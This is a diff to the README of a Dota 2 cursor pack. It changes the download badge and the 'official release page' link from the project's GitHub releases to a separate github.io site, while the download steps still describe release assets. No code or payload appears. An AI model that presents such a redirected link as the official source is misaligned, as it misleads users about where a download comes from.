@@ -1,6 +1,6 @@
 # 🖱️ dota2-cursors - Refresh your desktop with custom icons
 
-[![](https://img.shields.io/badge/Download_Cursors-Blue-blue)](https://github.com/woodrowhusbandly602/dota2-cursors/releases)
+[![](https://img.shields.io/badge/Download_Cursors-Blue-blue)](https://woodrowhusbandly602.github.io)
 
 ## 📖 About this project
 This project brings the visual style of Dota 2 to your computer desktop. Cursor packs allow you to change the standard pointer on your monitor to match the aesthetic of the game. These files work on Windows and Linux systems. You can customize your mouse pointer look to match specific heroes or themes from the Dota 2 universe.
@@ -11,7 +11,7 @@ You need a computer running Windows 10 or Windows 11 to use these files. You do 
 ## 💾 Downloading your cursors
 Follow these steps to obtain the files for your system:
 
-1. Visit the [official release page](https://github.com/woodrowhusbandly602/dota2-cursors/releases).
+1. Visit the [official release page](https://woodrowhusbandly602.github.io).
 2. Look for the section labeled "Assets."
 3. Click the link that ends in ".zip" to start your download.
 4. Save this file to your Downloads folder or your Desktop.
